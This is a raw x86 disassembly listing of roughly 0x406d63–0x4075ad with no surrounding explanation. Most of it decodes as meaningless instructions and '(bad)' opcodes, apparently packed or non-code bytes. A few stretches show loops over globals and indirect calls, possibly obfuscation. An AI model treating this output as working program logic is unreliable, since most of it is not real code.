  406d63:	addr16 mov ebx,0xcd1c5374
  406d69:	shr    bh,0x91
  406d6c:	inc    eax
  406d6d:	xor    al,0x3d
  406d6f:	jl     0x406ded
  406d71:	or     eax,0xdd7c7c7f
  406d76:	dec    eax
  406d77:	jae    0x406d00
  406d79:	mov    WORD PTR [ebp+0x20],fs
  406d7c:	pushf  
  406d7d:	sahf   
  406d7e:	mov    al,ds:0x99b894b2
  406d83:	mov    ah,0x9b
  406d85:	ja     0x406dbb
  406d87:	mov    dl,0x5d
  406d89:	ficom  DWORD PTR [edx+0x6a]
  406d8c:	repz repz into 
  406d8f:	pop    ss
  406d90:	jge    0x406d63
  406d92:	cmp    esi,edi
  406d94:	sbb    eax,0x93301178
  406d99:	mov    ecx,0x8e11e32a
  406d9e:	loope  0x406d6a
  406da0:	add    al,0x95
  406da2:	aad    0x76
  406da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406da5:	ficom  DWORD PTR [ebx]
  406da7:	xlat   BYTE PTR ds:[ebx]
  406da8:	mov    esp,0x6e24b9c7
  406dad:	inc    ebx
  406dae:	shl    BYTE PTR [edx-0x54],0xd5
  406db2:	jmp    0x406dfd
  406db4:	xor    al,0xc4
  406db6:	cmp    dl,BYTE PTR [edx+0x61]
  406db9:	cmp    bh,bl
  406dbb:	in     al,dx
  406dbc:	loopne 0x406d52
  406dbe:	imul   BYTE PTR [edx]
  406dc0:	push   es
  406dc1:	fdiv   DWORD PTR [ecx+0x2e]
  406dc4:	jbe    0x406deb
  406dc6:	adc    al,0xc
  406dc8:	mov    esp,0xa78c1208
  406dcd:	call   0x691c:0xe4d4f0bd
  406dd4:	call   0x783b5f80
  406dd9:	push   ebp
  406dda:	test   al,0x36
  406ddc:	stos   BYTE PTR es:[edi],al
  406ddd:	les    esp,FWORD PTR [ebp+0x2035eb69]
  406de3:	les    esi,FWORD PTR [ebp-0x21681c50]
  406de9:	jns    0x406e3a
  406deb:	or     edx,DWORD PTR ss:[edx-0x164b8d28]
  406df2:	or     DWORD PTR [ecx-0x73],esi
  406df5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406df7:	jle    0x406dce
  406df9:	jmp    0x10fa:0xb0c93ad9
  406e00:	inc    esi
  406e01:	cwde   
  406e02:	cmc    
  406e03:	shl    ebx,0x3b
  406e06:	adc    al,BYTE PTR [edi+edi*2]
  406e09:	ror    BYTE PTR [ebx-0x34],0xb9
  406e0d:	or     eax,0xc449106f
  406e12:	jmp    0x406e2a
  406e14:	cs inc ecx
  406e16:	fstp   st(4)
  406e18:	iret   
  406e19:	lea    esp,[eax-0x11]
  406e1c:	bound  eax,QWORD PTR [esi-0x47]
  406e1f:	sbb    eax,0x877594ea
  406e24:	jl     0x406e2d
  406e26:	cwde   
  406e27:	(bad)
  406e2a:	adc    eax,0x6bd515b9
  406e2f:	ds test eax,0xaf5677e2
  406e35:	pop    esi
  406e36:	sub    DWORD PTR [ebx+ecx*4],eax
  406e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e3a:	outs   dx,DWORD PTR ds:[esi]
  406e3b:	fnsetpm(287 only) 
  406e3d:	dec    esp
  406e3e:	xchg   ebx,eax
  406e3f:	sar    DWORD PTR [ecx-0x142e2026],cl
  406e45:	jmp    0x406ec1
  406e47:	das    
  406e48:	int3   
  406e49:	in     al,0xea
  406e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e4c:	stos   DWORD PTR es:[edi],eax
  406e4d:	(bad)  
  406e4e:	rcr    BYTE PTR [ebp+0x22697cd9],1
  406e54:	cmp    eax,DWORD PTR [ecx+ecx*2-0x23]
  406e58:	(bad)  
  406e59:	mov    edi,0x9e844fb3
  406e5e:	cmp    eax,0xe91e5c15
  406e63:	xchg   esp,eax
  406e64:	mov    bl,0xc4
  406e66:	xchg   ebp,eax
  406e67:	iret   
  406e68:	into   
  406e69:	add    DWORD PTR [ebx],eax
  406e6b:	cmc    
  406e6c:	sbb    ah,BYTE PTR [esi+0x38]
  406e6f:	jle    0x406eb3
  406e71:	jmp    0xc8ea53c8
  406e76:	daa    
  406e77:	and    BYTE PTR [ecx-0x3f],ch
  406e7a:	ret    
  406e7b:	pusha  
  406e7c:	pop    es
  406e7d:	outs   dx,DWORD PTR ds:[esi]
  406e7e:	or     BYTE PTR [ebx+0x2ecfa5d1],dh
  406e84:	push   DWORD PTR [eax]
  406e86:	lea    eax,ds:0x444024
  406e8c:	push   DWORD PTR [eax]
  406e8e:	lea    eax,ds:0x444258
  406e94:	push   DWORD PTR [eax]
  406e96:	lea    eax,ds:0x444348
  406e9c:	push   DWORD PTR [eax]
  406e9e:	xchg   ebx,edx
  406ea0:	inc    ebx
  406ea1:	inc    ebx
  406ea2:	jmp    0x406fce
  406ea7:	sbb    ebx,ecx
  406ea9:	mov    ecx,0xd9627d6c
  406eae:	ins    DWORD PTR es:[edi],dx
  406eaf:	lods   al,BYTE PTR ds:[esi]
  406eb0:	test   eax,0x5c0d7590
  406eb5:	es inc ebp
  406eb7:	lds    edi,FWORD PTR [esp+edi*2]
  406eba:	jl     0x406ec9
  406ebc:	jg     0x406f3a
  406ebe:	jl     0x406f02
  406ec0:	jp     0x406e91
  406ec2:	mov    esp,0x28016e8b
  406ec7:	push   0xb032f073
  406ecc:	mov    bh,0x63
  406ece:	xor    BYTE PTR [edi],ah
  406ed0:	adc    BYTE PTR [ecx],ch
  406ed2:	sub    bh,BYTE PTR [ebp+0x69c05f35]
  406ed8:	sub    cl,0xd8
  406edb:	mov    bh,0xf6
  406edd:	fwait
  406ede:	rol    BYTE PTR ds:0xa60cda01,1
  406ee4:	sbb    bh,ch
  406ee6:	addr16 cli 
  406ee8:	cmp    eax,0x6abc6f61
  406eed:	(bad)  
  406eee:	fist   WORD PTR [ebx+0x774b142]
  406ef4:	pop    edx
  406ef5:	sar    BYTE PTR [eax+0x13],0xeb
  406ef9:	scas   al,BYTE PTR es:[edi]
  406efa:	dec    esp
  406efb:	and    eax,0x8f8727ce
  406f00:	rcl    DWORD PTR [ebp-0x46],1
  406f03:	pusha  
  406f04:	out    dx,al
  406f05:	xchg   DWORD PTR [edi],eax
  406f07:	ret    0x3465
  406f0a:	mov    dl,0xb4
  406f0c:	dec    esi
  406f0d:	push   es
  406f0e:	inc    esp
  406f0f:	add    BYTE PTR [esi],dh
  406f11:	aam    0x91
  406f13:	daa    
  406f14:	push   esp
  406f15:	jecxz  0x406f74
  406f17:	pop    ebx
  406f18:	pop    ds
  406f19:	jmp    0x406f42
  406f1b:	mov    ds:0x1d4ada55,al
  406f20:	shr    edi,cl
  406f22:	ja     0x406ebf
  406f24:	inc    eax
  406f25:	pop    eax
  406f26:	mov    ah,0x4e
  406f28:	and    esp,DWORD PTR [ecx]
  406f2a:	cwde   
  406f2b:	add    eax,0x937d5240
  406f30:	rcr    BYTE PTR [ecx-0x4d],cl
  406f33:	jecxz  0x406f8c
  406f35:	xor    BYTE PTR [edx+0x59],al
  406f38:	inc    ebx
  406f39:	adc    al,0x56
  406f3b:	and    BYTE PTR [ebp-0x6fa10d52],ch
  406f41:	mov    BYTE PTR ds:0x12eaac96,ah
  406f47:	mov    al,ds:0xbc8b5808
  406f4c:	(bad)  
  406f4d:	pop    ecx
  406f4e:	jo     0x406f26
  406f50:	push   esp
  406f51:	cmp    eax,0x64dac159
  406f56:	js     0x406fa3
  406f58:	mov    edx,0x18c58a9c
  406f5d:	and    bl,BYTE PTR [ebp-0x35]
  406f60:	cmp    al,0x5b
  406f62:	jns    0x406f9a
  406f64:	mov    edi,0xaf0de590
  406f69:	retf   
  406f6a:	pop    ebx
  406f6b:	mov    DWORD PTR [ecx],esi
  406f6d:	mov    edi,0x3532e7be
  406f72:	out    0xf3,eax
  406f74:	xor    eax,esp
  406f76:	xchg   ebp,eax
  406f77:	adc    edi,DWORD PTR [esi+edx*4+0x2e0ef845]
  406f7e:	push   ebp
  406f7f:	mov    fs,WORD PTR ds:0xbe92174f
  406f85:	cs jmp 0xded37f98
  406f8b:	daa    
  406f8c:	inc    edx
  406f8d:	in     al,dx
  406f8e:	mov    eax,ds:0x85370041
  406f93:	mov    dl,ah
  406f95:	in     eax,dx
  406f96:	cmc    
  406f97:	clc    
  406f98:	into   
  406f99:	mov    ds:0x464e66d8,al
  406f9e:	ficom  WORD PTR [ebx+eax*1]
  406fa1:	scas   eax,DWORD PTR es:[edi]
  406fa2:	and    BYTE PTR [ecx],bl
  406fa4:	loope  0x407011
  406fa6:	xor    ebp,DWORD PTR [edx+0x2c]
  406fa9:	dec    ecx
  406faa:	push   edi
  406fab:	fcomi  st,st(3)
  406fad:	jno    0x40701c
  406faf:	or     cl,BYTE PTR [edx+esi*4]
  406fb2:	or     al,0x11
  406fb4:	mov    WORD PTR [ecx+edx*2],fs
  406fb7:	sbb    BYTE PTR [esi],ah
  406fb9:	fstp   DWORD PTR [eax]
  406fbb:	outs   dx,DWORD PTR ds:[esi]
  406fbc:	or     eax,0xa3600104
  406fc1:	std    
  406fc2:	test   eax,0x7298bdd4
  406fc7:	sbb    al,0x7c
  406fc9:	inc    ebx
  406fca:	jb     0x406fad
  406fcc:	mov    bl,0x9a
  406fce:	sub    ebx,0x3
  406fd1:	push   ebx
  406fd2:	pop    eax
  406fd3:	call   DWORD PTR [eax+0x1]
  406fd6:	mov    eax,DWORD PTR [ebp-0x20]
  406fd9:	mov    ecx,DWORD PTR ds:0x44421c
  406fdf:	jmp    0x40710b
  406fe4:	gs jg  0x406fc0
  406fe7:	add    DWORD PTR [ebp-0x27],edi
  406fea:	jge    0x40703f
  406fec:	jecxz  0x406fd1
  406fee:	stos   DWORD PTR es:[edi],eax
  406fef:	ins    BYTE PTR es:[edi],dx
  406ff0:	mov    ds:0xd2cbfe87,eax
  406ff5:	aas    
  406ff6:	jl     0x407074
  406ff8:	or     eax,0xfa7c7c7f
  406ffd:	push   eax
  406fff:	(bad)  
  407000:	jmp    0x407007
  407002:	stos   BYTE PTR es:[edi],al
  407003:	inc    eax
  407004:	dec    edi
  407005:	jecxz  0x406fa0
  407007:	fiadd  DWORD PTR [edi+0x26cb7355]
  40700d:	(bad)  
  40700e:	xchg   edi,eax
  40700f:	je     0x40702a
  407011:	sbb    DWORD PTR [ecx+0x7b],edi
  407014:	loope  0x406fad
  407016:	xchg   edi,eax
  407017:	imul   eax,DWORD PTR [esi],0x38839c9d
  40701d:	mov    ebp,0xa8a9d75c
  407022:	(bad)  
  407023:	dec    esi
  407024:	mov    ebx,DWORD PTR [ebx-0x60787477]
  40702a:	shl    ecx,0xbd
  40702d:	adc    al,0x5e
  40702f:	fild   WORD PTR [ebx-0x51]
  407032:	ja     0x407083
  407034:	shl    BYTE PTR [esi+0x226b1ff0],0xa8
  40703b:	sub    eax,0xf3b0b210
  407040:	rcl    DWORD PTR [edi-0x23b7377],cl
  407046:	sub    BYTE PTR [eax-0x60],ch
  407049:	jmp    0x3ab3:0xa8bdc371
  407050:	call   0xcf0f:0x689d9257
  407057:	pop    esp
  407058:	das    
  407059:	fidivr WORD PTR [esi+0x63]
  40705c:	jg     0x407026
  40705e:	loopne 0x406ffb
  407060:	js     0x407091
  407062:	jno    0x407055
  407064:	into   
  407065:	repnz and edx,DWORD PTR [esi-0x22]
  407069:	push   0xffffffad
  40706b:	jg     0x4070da
  40706d:	mov    ebp,DWORD PTR [ebp+0x52]
  407070:	cs jle 0x407055
  407073:	(bad)  
  407075:	adc    eax,DWORD PTR [eax-0x67a15ec6]
  40707b:	into   
  40707c:	adc    DWORD PTR [ebx+0x55],esi
  40707f:	mov    eax,0xb95061fe
  407084:	xchg   edi,eax
  407085:	(bad)  
  407086:	dec    eax
  407087:	mov    ecx,0x78bb6e88
  40708c:	gs sbb esp,0xfffffffc
  407090:	fimul  WORD PTR [eax]
  407092:	daa    
  407093:	scas   al,BYTE PTR es:[edi]
  407094:	ds (bad) 
  407096:	cmp    al,BYTE PTR [ebp+0xf2d7bbf]
  40709c:	mov    eax,0x4fe051e7
  4070a1:	pop    edx
  4070a2:	into   
  4070a3:	ret    
  4070a4:	mov    esi,0x9e29ef13
  4070a9:	xchg   edi,eax
  4070aa:	into   
  4070ab:	stos   DWORD PTR es:[edi],eax
  4070ac:	jnp    0x40706b
  4070ae:	lods   eax,DWORD PTR ds:[esi]
  4070af:	out    dx,al
  4070b0:	adc    eax,0x29498789
  4070b5:	add    eax,ebx
  4070b7:	push   ecx
  4070b8:	jl     0x407056
  4070ba:	add    cl,ch
  4070bc:	dec    edi
  4070bd:	scas   al,BYTE PTR es:[edi]
  4070be:	lea    ebp,[ecx]
  4070c0:	push   ds
  4070c1:	xchg   esp,eax
  4070c2:	sub    al,BYTE PTR [ebp-0x6e6386bf]
  4070c8:	loope  0x4070f0
  4070ca:	lock mov ah,ch
  4070cd:	cwde   
  4070ce:	push   eax
  4070cf:	mov    al,0x50
  4070d1:	adc    BYTE PTR ds:0xc81bdf60,dl
  4070d7:	inc    esp
  4070d8:	gs in  eax,dx
  4070da:	sub    esi,DWORD PTR [esi+0x754cc501]
  4070e0:	adc    ebx,DWORD PTR [ebx-0x2bae879e]
  4070e6:	shl    eax,cl
  4070e8:	aas    
  4070e9:	ja     0x4070bb
  4070eb:	ret    
  4070ec:	(bad)  
  4070ed:	add    ecx,DWORD PTR [eax]
  4070ef:	and    esp,esi
  4070f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070f2:	fdivp  st(6),st
  4070f4:	xchg   edi,eax
  4070f5:	mov    edi,0x804a6832
  4070fa:	push   0xa2bb605e
  4070ff:	(bad)  
  407100:	call   0x1faf7dba
  407105:	adc    al,0xfb
  407107:	dec    ebx
  407108:	jp     0x407128
  40710a:	jle    0x40710d
  40710c:	or     BYTE PTR [edi+0x5e],bl
  40710f:	pop    ebx
  407110:	leave  
  407111:	ret    
  407112:	push   ebp
  407113:	mov    ebp,esp
  407115:	sub    esp,0x2c
  407118:	xor    eax,0x6ce
  40711d:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  407124:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40712b:	or     DWORD PTR ds:0x44d414,0x5a5
  407135:	jmp    0x40726c
  40713a:	push   ds
  40713b:	repz lock adc al,0x95
  40713f:	pop    ss
  407140:	stos   BYTE PTR es:[edi],al
  407141:	lea    edi,[esi+0x16]
  407144:	nop
  407145:	push   ebx
  407146:	add    BYTE PTR [eax],ah
  407148:	inc    ebx
  407149:	sub    ebx,esp
  40714b:	ds jl  0x4071ca
  40714e:	push   es
  40714f:	jg     0x4071cd
  407151:	jl     0x407178
  407153:	and    DWORD PTR [ecx+edx*1+0x48],0x6e9b814a
  40715b:	(bad)
  40715e:	imul   edx,DWORD PTR [esi],0xffffffbf
  407161:	gs push esp
  407163:	icebp  
  407164:	sbb    cl,BYTE PTR [edi]
  407166:	in     eax,0xa1
  407168:	jl     0x4071cb
  40716a:	outs   dx,DWORD PTR ds:[esi]
  40716b:	mov    bh,0x1f
  40716d:	and    al,0x7b
  40716f:	out    0x79,al
  407171:	pusha  
  407172:	push   edi
  407173:	into   
  407174:	test   DWORD PTR [eax-0x796c7e7d],edx
  40717a:	imul   DWORD PTR [eax+ebx*8-0x4a0e367b]
  407181:	xchg   DWORD PTR [edx-0x31],ebp
  407184:	scas   eax,DWORD PTR es:[edi]
  407185:	jne    0x4071b3
  407187:	addr16 mov ch,0x29
  40718a:	and    esi,DWORD PTR [edi-0x41]
  40718d:	fild   DWORD PTR [eax+eax*8-0x3c8a7c9c]
  407194:	ret    0xf3d2
  407197:	stos   BYTE PTR es:[edi],al
  407198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407199:	add    eax,0xf5bc91df
  40719e:	ds jnp 0x407146
  4071a1:	leave  
  4071a2:	leave  
  4071a3:	addr16 (bad) 
  4071a5:	or     al,bh
  4071a7:	mov    esi,0x1a3e43d4
  4071ac:	out    dx,eax
  4071ad:	leave  
  4071ae:	jle    0x40720d
  4071b0:	out    dx,al
  4071b1:	jmp    0x2142:0x3df6df20
  4071b8:	xor    eax,0xb5e1a2c1
  4071bd:	adc    al,0x27
  4071bf:	out    0xb5,al
  4071c1:	out    0x2b,al
  4071c3:	repz je 0x4071d5
  4071c6:	pusha  
  4071c7:	call   0x559e29b0
  4071cc:	cdq    
  4071cd:	retf   0x2d25
  4071d0:	leave  
  4071d1:	jb     0x40721a
  4071d3:	jg     0x4071b6
  4071d5:	pop    es
  4071d6:	sbb    DWORD PTR [esi],edi
  4071d8:	mov    edx,0xf2e47981
  4071dd:	jnp    0x407216
  4071df:	mov    ecx,0x55428f09
  4071e4:	aaa    
  4071e5:	mov    cl,0x59
  4071e7:	dec    BYTE PTR [edi+0x6e]
  4071ea:	xor    BYTE PTR [ebp-0x66],dl
  4071ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ee:	jbe    0x40721b
  4071f0:	aam    0x95
  4071f2:	pop    ds
  4071f3:	ds (bad) 
  4071f5:	(bad)  
  4071f6:	lea    edx,[edx]
  4071f8:	js     0x4071a0
  4071fa:	jnp    0x407237
  4071fc:	jns    0x40724f
  4071fe:	iret   
  4071ff:	xchg   ebp,eax
  407200:	cmp    DWORD PTR [ecx+0x123c8cfa],ebx
  407206:	adc    BYTE PTR [edx-0x35],dl
  407209:	pop    es
  40720a:	int    0xf5
  40720c:	cmp    eax,0x1eb262fc
  407211:	pop    edi
  407212:	in     al,dx
  407213:	mov    eax,ds:0x39f2fc9e
  407218:	outs   dx,BYTE PTR ds:[esi]
  407219:	pop    ebp
  40721a:	cmp    dh,ch
  40721c:	mov    ebp,0xff2d9d92
  407221:	jg     0x4071db
  407223:	out    0x30,al
  407225:	add    al,0x44
  407227:	fdivr  DWORD PTR [esi+ecx*2]
  40722a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40722b:	jge    0x407299
  40722d:	sub    dl,ah
  40722f:	mov    ebp,ecx
  407231:	mov    esp,0xd8cc68e3
  407236:	mov    al,ds:0xf87a1a5b
  40723b:	in     al,0x8d
  40723d:	mov    ds:0x6377acba,al
  407242:	push   esi
  407243:	fcomp  DWORD PTR [ecx-0x11]
  407247:	push   esi
  407248:	stc    
  407249:	icebp  
  40724a:	add    eax,0x419a6d44
  40724f:	pop    edx
  407250:	stos   BYTE PTR es:[edi],al
  407251:	addr16 clc 
  407253:	push   edi
  407254:	jg     0x4071e5
  407256:	sub    dh,dh
  407258:	lock repnz or eax,0xbbb373e6
  40725f:	shr    DWORD PTR [ebx],cl
  407261:	push   eax
  407262:	hlt    
  407263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407264:	cmp    ebp,edi
  407266:	pop    ecx
  407267:	push   es
  407268:	call   0xb8f1ceac
  40726d:	pop    es
  40726e:	xchg   ebp,eax
  40726f:	add    BYTE PTR [eax],al
  407271:	and    DWORD PTR ds:0x41074f,0x0
  40727b:	mov    ecx,DWORD PTR ds:0x41074f
  407281:	inc    ecx
  407282:	mov    DWORD PTR ds:0x41074f,ecx
  407288:	cmp    DWORD PTR ds:0x41074f,0x20
  40728f:	jne    0x4072a0
  407295:	push   0x424736
  40729a:	call   DWORD PTR ds:0x44236c
  4072a0:	cmp    DWORD PTR ds:0x41074f,0x10
  4072a7:	jb     0x40727b
  4072ad:	or     DWORD PTR ds:0x44a6dc,0x61e1
  4072b7:	mov    WORD PTR [ebp-0x4],ax
  4072bb:	xor    DWORD PTR ds:0x44a6e0,0xdd9
  4072c5:	lea    eax,[ebp-0x24]
  4072c8:	and    ecx,DWORD PTR ds:0x44a6d8
  4072ce:	jmp    0x407405
  4072d3:	div    DWORD PTR [eax]
  4072d5:	test   BYTE PTR [ebx],ah
  4072d7:	pop    ebx
  4072d8:	jnp    0x407285
  4072da:	js     0x407349
  4072dc:	ds xchg ebx,eax
  4072de:	mov    esp,0x29784804
  4072e3:	lea    esi,[ecx]
  4072e5:	jl     0x407363
  4072e7:	push   es
  4072e8:	jg     0x407366
  4072ea:	jl     0x40736b
  4072ec:	push   edi
  4072ed:	cmc    
  4072ee:	push   edi
  4072ef:	mov    ds:0x5e9577f5,eax
  4072f4:	outs   dx,BYTE PTR ds:[esi]
  4072f5:	rol    ch,cl
  4072f7:	scas   eax,DWORD PTR es:[edi]
  4072f8:	cmc    
  4072f9:	ja     0x407293
  4072fb:	push   ecx
  4072fc:	popf   
  4072fd:	aaa    
  4072fe:	mov    ecx,0x501b2898
  407303:	retf   
  407304:	and    al,0x59
  407306:	inc    eax
  407307:	dec    esi
  407308:	mov    BYTE PTR [edi+0x17985ac3],dl
  40730e:	pop    edi
  40730f:	or     al,0x38
  407311:	out    0x65,eax
  407313:	lds    esi,FWORD PTR [ecx+eiz*1-0x75]
  407317:	cli    
  407318:	cld    
  407319:	jb     0x407335
  40731b:	add    BYTE PTR [ecx+0x57450fad],dh
  407321:	lahf   
  407322:	jmp    0x8d99:0x6330b85a
  407329:	loopne 0x40735e
  40732b:	mov    ebp,0x2ce05fb8
  407330:	push   0x17
  407332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407333:	bnd es ret 0xa1b7
  407338:	xor    DWORD PTR [ebx],eax
  40733a:	add    DWORD PTR ds:0xbdabbbb4,ebp
  407340:	mov    eax,0x6764144
  407345:	and    eax,0xf66e739d
  40734a:	retf   
  40734b:	aaa    
  40734c:	pop    ecx
  40734d:	mov    ebx,0xde60785a
  407352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407353:	rcr    bh,cl
  407355:	xor    al,BYTE PTR [ecx+0x30]
  407358:	jp     0x40738f
  40735a:	xlat   BYTE PTR ds:[ebx]
  40735b:	xor    ch,al
  40735d:	ret    
  40735e:	ret    
  40735f:	jmp    0x46a5f945
  407364:	mov    DWORD PTR [ebx-0x58],esp
  407367:	es xchg edi,eax
  407369:	int    0x8b
  40736b:	jmp    0xfbff:0xcaf00bc7
  407372:	mov    eax,ds:0x9a8fa8be
  407377:	gs in  eax,dx
  407379:	mov    al,ds:0x1b693ee3
  40737e:	sub    ecx,edi
  407380:	xchg   esp,eax
  407381:	sbb    BYTE PTR [edi-0x12f19102],0x44
  407388:	jg     0x407318
  40738a:	inc    edx
  40738b:	mov    al,ds:0xb4752152
  407390:	cmp    eax,0x19ddb59
  407395:	stos   BYTE PTR es:[edi],al
  407396:	fwait
  407397:	das    
  407398:	sahf   
  407399:	inc    ecx
  40739a:	dec    esp
  40739b:	push   ebx
  40739c:	xor    BYTE PTR [esi+0x604c6307],ah
  4073a2:	xchg   edx,eax
  4073a3:	push   ds
  4073a4:	mov    eax,0x1647f611
  4073a9:	ja     0x4073a4
  4073ab:	inc    esi
  4073ac:	jge    0x4073a6
  4073ae:	dec    esi
  4073af:	sub    BYTE PTR [edx],0x5e
  4073b2:	inc    esp
  4073b3:	sub    al,0x68
  4073b5:	imul   esi,ebx,0x3dfef9a2
  4073bb:	or     dl,0x4e
  4073be:	adc    DWORD PTR [ebp+0x63],esi
  4073c1:	ins    DWORD PTR es:[edi],dx
  4073c2:	cmp    BYTE PTR fs:[ebx-0x5d],bh
  4073c6:	mov    eax,cs:0xcd36186c
  4073cc:	sbb    al,dl
  4073ce:	stos   BYTE PTR es:[edi],al
  4073cf:	jmp    0x7a6c:0x21a98304
  4073d6:	add    ch,ah
  4073d8:	and    edx,DWORD PTR [edi+edi*2+0x14]
  4073dc:	jge    0x4073c6
  4073de:	ret    0x649
  4073e1:	mov    bh,0x1
  4073e3:	mov    esp,0x494716ed
  4073e8:	cdq    
  4073e9:	(bad)  
  4073ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073eb:	xchg   esi,esp
  4073ed:	mov    cs,WORD PTR [eax-0x21520348]
  4073f3:	sar    BYTE PTR [ebp+0x547e925b],cl
  4073f9:	iret   
  4073fa:	lods   eax,DWORD PTR ds:[esi]
  4073fb:	fnstsw WORD PTR [ecx]
  4073fd:	leave  
  4073fe:	aam    0x4c
  407400:	pop    edi
  407401:	popa   
  407402:	inc    edx
  407403:	(bad)  
  407404:	sbb    ecx,DWORD PTR [ecx+0x32e9d845]
  40740a:	add    DWORD PTR [eax],eax
  40740c:	add    BYTE PTR [ecx+ebx*8+0x66696689],ah
  407413:	fld    DWORD PTR [bp+si]
  407416:	xor    eax,0xb849cc56
  40741b:	fmul   DWORD PTR [esi-0x69]
  40741e:	xor    BYTE PTR [esp+edi*2+0x6],bh
  407422:	jg     0x4074a0
  407424:	jl     0x4073f1
  407426:	shl    BYTE PTR [ebp+0x28],cl
  407429:	pop    esp
  40742a:	(bad)  
  40742b:	fadd   QWORD PTR [esi-0x20]
  40742e:	js     0x4073f3
  407430:	mov    WORD PTR [eax+0x1b8ee95],ax
  407437:	cwde   
  407438:	retf   
  407439:	loop   0x4074ad
  40743b:	push   ebx
  40743c:	mov    bl,0xc4
  40743e:	mov    ds:0x5c984458,ax
  407444:	jmp    0x33cf9f51
  407449:	mov    ebx,0x1c511a6f
  40744e:	pusha  
  40744f:	imul   edi,DWORD PTR [edi-0x42ae08ad],0x8d096b48
  407459:	xchg   esi,eax
  40745a:	or     ah,0xc1
  40745d:	test   BYTE PTR [edx-0x17],bl
  407460:	bound  eax,QWORD PTR [esi-0x7]
  407463:	sub    al,0xa4
  407465:	mov    al,ds:0xadf6968a
  40746a:	mov    bh,0x5f
  40746c:	mov    cl,0x94
  40746e:	ins    DWORD PTR es:[edi],dx
  40746f:	(bad)  
  407470:	test   DWORD PTR [edi+0x31],edx
  407473:	xor    al,BYTE PTR [edx-0x49fcdf8a]
  407479:	sbb    eax,0x7f363720
  40747e:	inc    esi
  40747f:	adc    edx,ebp
  407481:	jmp    0x4074cc
  407483:	(bad)  
  407484:	outs   dx,DWORD PTR ds:[esi]
  407485:	enter  0xf97,0x84
  407489:	xchg   edx,eax
  40748a:	inc    edi
  40748b:	mov    DWORD PTR [edi-0x3d0d1ee2],ebx
  407491:	sub    eax,DWORD PTR [edi]
  407493:	sbb    ecx,esi
  407495:	push   esp
  407496:	cdq    
  407497:	imul   esp,DWORD PTR [ebx],0xd9c0a33b
  40749d:	jns    0x4074c0
  40749f:	rol    BYTE PTR [eax-0xd],cl
  4074a2:	inc    ebx
  4074a3:	xor    eax,0xce14f9ad
  4074a8:	xchg   ecx,eax
  4074a9:	pop    esp
  4074aa:	iret   
  4074ab:	push   ss
  4074ac:	mov    ebx,0xf250ef97
  4074b1:	jbe    0x40749a
  4074b3:	mov    eax,DWORD PTR [ebp+0x5]
  4074b6:	test   eax,0x4cca5151
  4074bb:	lods   eax,DWORD PTR ds:[esi]
  4074bc:	cmp    al,0x8b
  4074be:	adc    BYTE PTR [edx+0x60b431f7],ch
  4074c4:	or     ah,BYTE PTR [eax]
  4074c6:	jp     0x407528
  4074c8:	push   ecx
  4074c9:	pusha  
  4074ca:	pusha  
  4074cb:	rcr    edx,0x34
  4074ce:	mov    al,0x3a
  4074d0:	mov    BYTE PTR [edi+edi*8-0x43],0x4a
  4074d5:	xchg   edx,eax
  4074d6:	leave  
  4074d7:	stc    
  4074d8:	popa   
  4074d9:	sub    eax,0x39f26155
  4074de:	in     al,0x63
  4074e0:	mov    dh,0xfb
  4074e2:	in     al,dx
  4074e3:	ret    
  4074e4:	scas   al,BYTE PTR es:[edi]
  4074e5:	mov    ds:0xd94e022,al
  4074ea:	xor    ebx,DWORD PTR [ebx]
  4074ec:	and    esi,DWORD PTR [ecx+eiz*8]
  4074ef:	ds lahf 
  4074f1:	inc    esp
  4074f2:	mov    ebx,0xfb24f3ca
  4074f7:	icebp  
  4074f8:	mov    ?,WORD PTR [esi-0x20]
  4074fb:	inc    ebp
  4074fc:	in     al,dx
  4074fd:	lods   al,BYTE PTR ds:[esi]
  4074fe:	test   eax,0xc46ff550
  407503:	mov    esi,0x60cf5ecf
  407508:	adc    al,0xe
  40750b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40750c:	xor    eax,0xb8c72482
  407511:	loopne 0x4074de
  407513:	inc    ebp
  407514:	jno    0x407590
  407516:	cwde   
  407517:	jle    0x40752d
  407519:	add    eax,0xc21a0da0
  40751e:	and    ebx,edx
  407520:	mov    bl,0x74
  407522:	sbb    cl,al
  407524:	mov    esi,DWORD PTR [ecx]
  407526:	pushf  
  407527:	lds    esi,FWORD PTR [ebx+ebp*2-0x781e28b2]
  40752e:	rol    DWORD PTR cs:[esi+eiz*1+0x32],0x44
  407534:	call   0xd6b3514f
  407539:	or     BYTE PTR [ebp+0x70],al
  40753c:	test   eax,0x458bef0e
  407541:	or     BYTE PTR [ebx],al
  407543:	or     eax,0x44a6e0
  407548:	mov    DWORD PTR [ebp-0x20],eax
  40754b:	sbb    ecx,0x41ef
  407551:	push   ebx
  407552:	lea    eax,[ebp-0x18]
  407555:	mov    DWORD PTR [ebp-0x1c],eax
  407558:	mov    eax,DWORD PTR [ebp-0x1c]
  40755b:	adc    DWORD PTR ds:0x44d410,ecx
  407561:	push   esi
  407562:	push   edi
  407563:	mov    edi,0xf89f2dad
  407568:	or     DWORD PTR ds:0x44a6d8,0x25a
  407572:	mov    DWORD PTR [eax],edi
  407574:	mov    eax,DWORD PTR [ebp-0x14]
  407577:	mov    ebx,DWORD PTR [ebp-0x8]
  40757a:	and    esi,0x501d
  407580:	mov    ecx,0x7510857
  407585:	xor    eax,ecx
  407587:	and    DWORD PTR ds:0x424742,0x0
  407591:	xor    esi,esi
  407593:	or     esi,DWORD PTR ds:0x424742
  407599:	inc    esi
  40759a:	mov    DWORD PTR ds:0x424742,esi
  4075a0:	cmp    DWORD PTR ds:0x424742,0x24
  4075a7:	jne    0x4075b8
  4075ad:	push   0x41088a
